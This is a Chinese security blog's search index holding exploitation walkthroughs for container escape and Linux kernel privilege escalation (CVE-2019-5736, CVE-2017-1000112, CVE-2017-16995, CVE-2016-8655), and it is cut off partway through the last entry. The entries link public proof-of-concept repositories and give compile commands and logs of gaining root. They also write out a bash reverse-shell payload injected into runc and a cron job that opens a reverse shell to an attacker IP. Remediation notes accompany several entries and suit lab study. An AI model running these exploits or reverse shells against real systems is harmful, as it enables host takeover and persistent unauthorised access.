<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2019-5736</title>
      <link href="/2021/12/20/CVE-2019-5736/"/>
      <url>/2021/12/20/CVE-2019-5736/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，因此可以以root的身份执行命令，导致获得宿主机的root权限。</p><span id="more"></span><h3 id="利用方式："><a href="#利用方式：" class="headerlink" title="利用方式："></a>利用方式：</h3><ol><li>宿主机利用攻击者提供的image来创建一个新的container 。</li><li>拥有container root权限，并且该container后续被docker exec attach。</li></ol><h3 id="影响："><a href="#影响：" class="headerlink" title="影响："></a>影响：</h3><ul><li>docker version &lt;=18.09.2 （然而实际测试的结果是docker version 18.09.1失败）</li><li>RunC version &lt;=1.0-rc6</li></ul><p><img src="image-20211110151843107.png"></p><h3 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h3><p>方案一：新建k8s 1.11或1.12集群。容器服务新创建的1.11或1.12版本的Kubernetes集群已经包含修复该漏洞的Docker版本。</p><p>方案二：升级Docker。升级已有集群的Docker到18.09.2或以上版本。该方案会导致容器和业务中断。</p><p>方案三：仅升级runc（针对Docker版本17.06）。为避免升级Docker引擎造成的业务中断，可以按照下文的步骤文档，逐一升级集群节点上的runc二进制。</p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>利用poc地址</p><p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p><p>利用前提前备份/usr/bin/docker-runc文件</p><ul><li>修改payload</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi main.go</span><br><span class="line">payload = <span class="string">&quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/x.x.x.x/1234 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure><ul><li>编译</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</span><br></pre></td></tr></table></figure><p>在容器中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@882ba22e4fdb:/home<span class="comment"># ./main </span></span><br><span class="line">[+] Overwritten /bin/sh successfully</span><br><span class="line">[+] Found the PID: 31</span><br><span class="line">[+] Successfully got the file handle</span><br><span class="line">[+] Successfully got write handle &amp;&#123;0xc0003b3ce0&#125;</span><br></pre></td></tr></table></figure><p>在攻击机上用nc侦听,并获取shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc  -l 1234</span><br><span class="line">root@wuala:/<span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">root@wuala:/<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查看docker-runc文件，已经被更改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@wuala:~<span class="comment"># cat  /usr/bin/docker-runc  | xxd </span></span><br><span class="line">00000000: 2321 2f62 696e 2f62 6173 6820 0a20 6261  <span class="comment">#!/bin/bash . ba</span></span><br><span class="line">00000010: 7368 202d 6920 3e26 202f 6465 762f 7463  sh -i &gt;&amp; /dev/tc</span><br><span class="line">00000020: 702f 3130 2e30 2e34 2e36 382f 3132 3334  p/10.0.4.68/1234</span><br><span class="line">00000030: 2030 3e26 31                              0&gt;&amp;1</span><br><span class="line">root@wuala:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><h3 id="恶意镜像方式"><a href="#恶意镜像方式" class="headerlink" title="恶意镜像方式"></a>恶意镜像方式</h3><p><a href="https://github.com/q3k/cve-2019-5736-poc">https://github.com/q3k/cve-2019-5736-poc</a></p><p><img src="image-20211110163634892.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 容器逃逸 </tag>
            
            <tag> 云原生 </tag>
            
            <tag> CVE-2019-5736 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-1000112</title>
      <link href="/2021/12/20/CVE-2017-1000112/"/>
      <url>/2021/12/20/CVE-2017-1000112/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>由于 UFO 到非 UFO 路径切换导致的可利用内存损坏。使用 MSG_MORE __ip_append_data() 构建 UFO 数据包时，会调用 ip_ufo_append_data() 进行追加。然而，在两次 send() 调用之间，追加路径可以从 UFO 切换到非 UFO 路径，这会导致内存损坏。</p><p>针对 UFO Linux 内核实现 CVE-2017-1000112 中漏洞的概念验证本地根利用。</p><span id="more"></span><h3 id="什么是UFO"><a href="#什么是UFO" class="headerlink" title="什么是UFO"></a>什么是UFO</h3><ul><li><p>UFO(UDP Fragment Offload)是硬件网卡提供的一种特性，由内核和驱动配合完成相关功能。其目的是由网卡硬件来完成本来需要软件进行的分段(分片)操作用于提升效率和性能。减少Linux 内核传输层和网络层的计算工作，将这些计算工作offload（卸载）到物理网卡。UDP协议层本身不对大的数据报进行分片，而是交给IP层去做。因此，UFO就是将IP分片offload到网卡中进行。</p></li><li><p>如大家所知，在网络上传输的数据包不能大于mtu，当用户发送大于mtu的数据报文时，通常会在传输层(或者在特殊情况下在IP层分片，比如ip转发或ipsec时)就会按mtu大小进行分段，防止发送出去的报文大于mtu，为提升该操作的性能，新的网卡硬件基本都实现了UFO功能，可以使分段(或分片)操作在网卡硬件完成，此时用户态就可以发送长度大于mtu的包，而且不必在协议栈中进行分段(或分片)。</p></li><li><p><strong>这就意味着当开启UFO时，可以支持发送超过MTU大小的数据报。</strong></p></li><li><p>ip_ufo_append_data函数大致原理为：当硬件支持且打开了UFO、udp包大小大于mtu会进入此流程，将用户态数据拷贝拷skb中的非线性区中(即skb_shared_info-&gt;frags[]，原本用于SG)。</p></li><li><p>主要流程为：从sock发送队列中取skb，如果发送队列为空，则新分配一个skb；如果不为空，则直接使用该skb；然后,判断per task的page_frag中是否有空间可用，有的话，就直接从用户态拷贝数据到该page_frag中，如果没有空间，则分配新的page，放入page_frag中，然后再从用户态拷贝数据到其中，最后将该page_frag中的page链入skb的非线性区中(即skb_shared_info-&gt;frags[]).</p></li></ul><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>影响linux kernel 4.12.3之前的版本，在4.14的版本将移除UFO机制。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>poc下载</p><p>poc:<a href="https://github.com/Metarget/metarget/blob/master/writeups_cnv/kernel-cve-2017-1000112/poc.c">https://github.com/Metarget/metarget/blob/master/writeups_cnv/kernel-cve-2017-1000112/poc.c</a></p><p>  编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@wuala:/home<span class="comment"># gcc -o exp poc.c  </span></span><br><span class="line">root@wuala:/home<span class="comment"># </span></span><br><span class="line">root@wuala:/home<span class="comment"># ls</span></span><br><span class="line">exp  poc.c  wulala</span><br></pre></td></tr></table></figure><p>查看环境</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu-68d495dd49-fcswz:/home<span class="comment"># uname -a </span></span><br><span class="line">Linux ubuntu-68d495dd49-fcswz 4.8.0-34-generic <span class="comment">#36~16.04.1-Ubuntu SMP Wed Dec 21 18:55:08 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">root@ubuntu-68d495dd49-fcswz:/home<span class="comment"># uname -r </span></span><br><span class="line">4.8.0-34-generic</span><br><span class="line">root@ubuntu-68d495dd49-fcswz:/home<span class="comment"># cat /etc/issue</span></span><br><span class="line">Ubuntu 20.04.3 LTS \n \l</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu-68d495dd49-fcswz:/home<span class="comment"># ./exp  </span></span><br><span class="line">[^] starting</span><br><span class="line">[=] running KASLR defeat exploit (CVE-2017-18344)</span><br><span class="line">[0] enumerating divide_error() location (CVE-2017-18344)</span><br><span class="line">[&gt;] setting up proc reader</span><br><span class="line">[+] <span class="keyword">done</span></span><br><span class="line">[&gt;] checking /proc/cpuinfo</span><br><span class="line">[+] looks good</span><br><span class="line">[&gt;] setting up timer</span><br><span class="line">[+] <span class="keyword">done</span></span><br><span class="line">[&gt;] finding leak pointer address</span><br><span class="line">[+] <span class="keyword">done</span>: 0000000201232860</span><br><span class="line">[&gt;] mapping leak pointer page</span><br><span class="line">[+] <span class="keyword">done</span></span><br><span class="line">[+] divide_error is at:        ffffffff82097200</span><br><span class="line">[1] checking distro and kernel versions</span><br><span class="line">[.] kernel version <span class="string">&#x27;4.8.0-34-generic&#x27;</span> detected</span><br><span class="line">[+] <span class="keyword">done</span>, versions looks good</span><br><span class="line">[2] checking SMEP and SMAP</span><br><span class="line">[+] <span class="keyword">done</span>, looks good</span><br><span class="line">[=] running privilege escalation exploit (CVE-2017-1000112)</span><br><span class="line">[3] setting up namespace sandbox</span><br><span class="line">[+] <span class="keyword">done</span>, namespace sandbox <span class="built_in">set</span> up</span><br><span class="line">[~] commit_creds:        ffffffff818a5d50</span><br><span class="line">[~] prepare_kernel_cred: ffffffff818a6140</span><br><span class="line">[4] SMEP bypass enabled, mmapping fake stack</span><br><span class="line">[+] <span class="keyword">done</span>, fake stack mmapped</span><br><span class="line">[5] executing payload ffffffff81817d15</span><br><span class="line">[+] <span class="keyword">done</span>, should be root now</span><br><span class="line">[6] checking <span class="keyword">if</span> we got root</span><br><span class="line">[+] got r00t ^_^</span><br></pre></td></tr></table></figure><p>执行后，网卡没有ip地址，无法网络通讯，通过ps 可以确认确实逃逸成功。后续利用可以写ssh key或定时计划</p><p>利用前ifconfig &amp; ps</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu-68d495dd49-fcswz:/home<span class="comment"># ps aux </span></span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root         1  0.0  0.0   4112  3376 pts/0    Ss+  07:39   0:00 bash</span><br><span class="line">root        26  0.0  0.0   4240  3588 pts/1    Ss   07:43   0:00 /bin/bash</span><br><span class="line">root       318  0.0  0.0   5900  2908 pts/1    R+   07:48   0:00 ps aux</span><br><span class="line"></span><br><span class="line">root@ubuntu-68d495dd49-fcswz:/home<span class="comment"># ifconfig </span></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1450</span><br><span class="line">        inet 10.244.0.8  netmask 255.255.255.0  broadcast 0.0.0.0</span><br><span class="line">        ether 8e:c1:f5:30:6c:1d  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 6484  bytes 20715710 (20.7 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 6479  bytes 451059 (451.0 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><p>利用后ifconfig &amp; ps</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu-68d495dd49-fcswz:/<span class="comment"># ps aux </span></span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root      8291  0.0  0.0   7652  4368 ?        Sl   07:21   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      8309  0.9  1.1 210244 94068 ?        Ssl  07:21   0:16 kube-controller-manager --allocate-node-cidrs=<span class="literal">true</span> --au</span><br><span class="line">root      8529  0.0  0.0   7652  4416 ?        Sl   07:22   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      8545  0.0  0.0   1024     4 ?        Ss   07:22   0:00 /pause</span><br><span class="line">root      8573  0.0  0.0   7652  4424 ?        Sl   07:22   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      8589  0.0  0.0   1024     4 ?        Ss   07:22   0:00 /pause</span><br><span class="line">root      8689  0.0  0.0   7716  4432 ?        Sl   07:22   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      8723  0.0  0.4 139624 35492 ?        Ssl  07:22   0:00 /usr/<span class="built_in">local</span>/bin/kube-proxy --config=/var/lib/kube-proxy/</span><br><span class="line">root      8809  0.0  0.0   7652  4516 ?        Sl   07:22   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      8825  0.0  0.5 1339640 41928 ?       Ssl  07:22   0:00 /opt/bin/flanneld --ip-masq --kube-subnet-mgr</span><br><span class="line">root      8946  0.0  0.0   7652  3884 ?        Sl   07:22   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      8963  0.0  0.0   1024     4 ?        Ss   07:22   0:00 /pause</span><br><span class="line">root      9038  0.0  0.0   7652  4492 ?        Sl   07:22   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      9053  0.1  0.4 146036 35752 ?        Ssl  07:22   0:02 /coredns -conf /etc/coredns/Corefile</span><br><span class="line">root      9113  0.0  0.0   7652  4304 ?        Sl   07:22   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      9128  0.0  0.0   1024     4 ?        Ss   07:22   0:00 /pause</span><br><span class="line">root      9198  0.0  0.0   7652  4436 ?        Sl   07:22   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root      9216  0.1  0.4 146036 37948 ?        Ssl  07:22   0:03 /coredns -conf /etc/coredns/Corefile</span><br><span class="line">root     10693  0.0  0.0      0     0 ?        S    07:26   0:00 [kworker/1:3]</span><br><span class="line">root     11304  0.0  0.0      0     0 ?        S    07:27   0:00 [kworker/u4:0]</span><br><span class="line">root     15132  0.0  0.0      0     0 ?        S    07:38   0:00 [kworker/1:2]</span><br><span class="line">root     15570  0.0  0.0   7716  3756 ?        Sl   07:39   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root     15586  0.0  0.0   1024     4 ?        Ss   07:39   0:00 /pause</span><br><span class="line">root     15641  0.0  0.0      0     0 ?        S    07:39   0:00 [kworker/0:3]</span><br><span class="line">root     15779  0.0  0.0   9060  4540 ?        Sl   07:39   0:00 docker-containerd-shim -namespace moby -workdir /var/li</span><br><span class="line">root     15795  0.0  0.0   4112  3376 pts/0    Ss+  07:39   0:00 bash</span><br><span class="line">root     16711  0.0  0.0      0     0 ?        S    07:42   0:00 [kworker/u4:1]</span><br><span class="line">root     17015  0.0  0.5 145080 41804 pts/0    Sl+  07:43   0:00 kubectl <span class="built_in">exec</span> -it pod/ubuntu-68d495dd49-fcswz /bin/bash</span><br><span class="line">root     17032  0.0  0.0   4240  3588 pts/1    Ss   07:43   0:00 /bin/bash</span><br><span class="line">root     17724  0.0  0.0 105704  7056 ?        Ss   07:45   0:00 sshd: root@pts/1</span><br><span class="line">root     17790  0.0  0.0  21368  5000 pts/1    Ss+  07:45   0:00 -bash</span><br><span class="line">root     18571  0.0  0.0      0     0 ?        S    07:48   0:00 [kworker/u4:2]</span><br><span class="line">root     18645  0.0  0.0  18516  3336 pts/1    S    07:49   0:00 /bin/bash -i</span><br><span class="line">root     18659  0.0  0.0  36708  3176 pts/1    R+   07:49   0:00 ps aux</span><br><span class="line"></span><br><span class="line">root@ubuntu-68d495dd49-fcswz:/<span class="comment"># ifconfig </span></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 1500</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1  (Local Loopback)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">root@ubuntu-68d495dd49-fcswz:/<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="定时计划反弹shell"><a href="#定时计划反弹shell" class="headerlink" title="定时计划反弹shell"></a>定时计划反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu-68d495dd49-fcswz:/var/spool/cron/crontabs<span class="comment"># crontab -l</span></span><br><span class="line">*/1 * * * *  /bin/bash /shell.sh</span><br><span class="line">root@ubuntu-68d495dd49-fcswz:/var/spool/cron/crontabs<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">root@ubuntu-68d495dd49-fcswz:/var/spool/cron/crontabs<span class="comment"># cat /shell.sh </span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">sh -i &gt;&amp; /dev/tcp/10.0.4.68/4444 0&gt;&amp;1</span><br><span class="line">root@ubuntu-68d495dd49-fcswz:/var/spool/cron/crontabs<span class="comment"># </span></span><br><span class="line"></span><br><span class="line">攻击机器</span><br><span class="line">╭─wulala@wulaladeMacBook-Pro ~/tools/cloud_ex/cve-poc ‹master*›</span><br><span class="line">╰─$ nc -l 4444</span><br><span class="line">sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string"># ip addr</span></span><br><span class="line"><span class="string">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span></span><br><span class="line"><span class="string">    link/ether 00:0c:29:b0:82:1b brd ff:ff:ff:ff:ff:ff</span></span><br><span class="line"><span class="string">    inet 192.168.100.123/24 brd 192.168.100.255 scope global ens160</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string">    inet6 fe80::20c:29ff:feb0:821b/64 scope link</span></span><br><span class="line"><span class="string">       valid_lft forever preferred_lft forever</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># whoami</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">#</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h3><p>影响linux kernel 4.12.3之前的版本，在4.14的版本将移除UFO机制。升级到4.12.3以上版本</p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE-2017-1000112 </tag>
            
            <tag> 容器逃逸 </tag>
            
            <tag> 云原生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-16995</title>
      <link href="/2021/12/20/CVE-2017-16995/"/>
      <url>/2021/12/20/CVE-2017-16995/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>该漏洞存在于调用eBPF bpf(2)的Linux内核系统中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题， 低权限用户可使用此漏洞获得管理权限。</p><span id="more"></span><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Linux Kernel Version 4.14-4.4 仅影响Ubuntu/Debian发行版本</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>查看版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@wuala:/tmp<span class="comment"># uname -a </span></span><br><span class="line">Linux wuala 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">root@wuala:/tmp<span class="comment"># uname -r </span></span><br><span class="line">4.4.0-116-generic</span><br><span class="line">root@wuala:/tmp<span class="comment"># cat /etc/issue</span></span><br><span class="line">Ubuntu 18.04.6 LTS \n \l</span><br><span class="line"></span><br><span class="line">root@wuala:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><p>下载<a href="https://github.com/SecWiki/linux-kernel-exploits/tree/master/2017/CVE-2017-16995">poc</a> ，并编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -o pwned upstream44.c</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ./pwned </span><br><span class="line">task_struct = ffff8800b9ff72c0</span><br><span class="line">uidptr = ffff8800b87c4f04</span><br><span class="line">spawning root shell</span><br><span class="line">root@wuala:/tmp<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(<span class="built_in">test</span>)</span><br><span class="line">root@wuala:/tmp<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@wuala:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>目前暂未有明确的补丁升级方案提出，但是建议用户通过修改内核参数限制普通用户使用bpf(2)系统调用来缓解： 设置参数“kernel.unprivileged_bpf_disabled = 1”通过限制对bpf(2)调用了访问来防止这种特权升级<br><code>root@Ubuntu# echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled</code></p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>升级Linux Kernel 版本，需要重启服务器之后生效： 这一步在环境搭建过程中已经描述过了具体的操作，用户只需要修改内核版本即可！</p><h4 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h4><p>代码补丁 <a href="https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f">https://github.com/torvalds/linux/commit/95a762e2c8c942780948091f8f2a4f32fce1ac6f</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
            <tag> CVE-2017-16995 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2016-8655</title>
      <link href="/2021/12/20/CVE-2016-8655/"/>
      <url>/2021/12/20/CVE-2016-8655/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>此漏洞可用于未授权进程中执行内核代码，恶意访问者只需要本地普通权限，就可以利用该漏洞提升到管理员权限。</p><p>注：旧内核包含偏移量，但它们未经测试，因此请注意，此漏洞可能会使 4.4 之前的内核崩溃。</p><span id="more"></span><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>Linux内核(2011年4月19日发行)开始就受影响了，直到2016年11月30日修复。</p><p>( 注：这里并非指从11年到16年所有的Linux内核都会受到影响，敬请依据各系统情况而定)</p><p>Linuxkernel version &lt; 4.8.13</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>查看系统内核版本和用户属性</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/issue</span><br><span class="line">Ubuntu 20.04.3 LTS \n \l</span><br><span class="line"></span><br><span class="line">$ uname -a </span><br><span class="line">Linux 6fdeca8326ab 4.4.0-51-generic <span class="comment">#72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">$ id </span><br><span class="line">uid=1001(<span class="built_in">test</span>) gid=1001(<span class="built_in">test</span>) groups=1001(<span class="built_in">test</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>下载poc文件，并编译</p><p>poc地址：<a href="https://github.com/LakshmiDesai/CVE-2016-8655">https://github.com/LakshmiDesai/CVE-2016-8655</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/LakshmiDesai/CVE-2016-8655</span><br><span class="line">$ <span class="built_in">cd</span> CVE-2016-8655-master</span><br><span class="line">$ gcc chocobo_root.c -o chocobo_root -lpthread</span><br></pre></td></tr></table></figure><p>执行poc，并获取高权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 